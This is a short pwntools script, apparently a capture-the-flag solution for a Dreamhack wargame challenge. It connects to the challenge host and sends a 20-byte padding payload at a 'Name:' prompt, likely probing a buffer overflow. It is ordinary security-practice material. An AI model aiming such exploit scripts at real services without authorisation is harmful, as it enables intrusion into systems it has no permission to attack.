from pwn import *
context.log_level = 'debug'

n = remote('host1.dreamhack.games',8398)

payload = b'A'*20

n.sendafter('Name:',payload)

n.interactive()
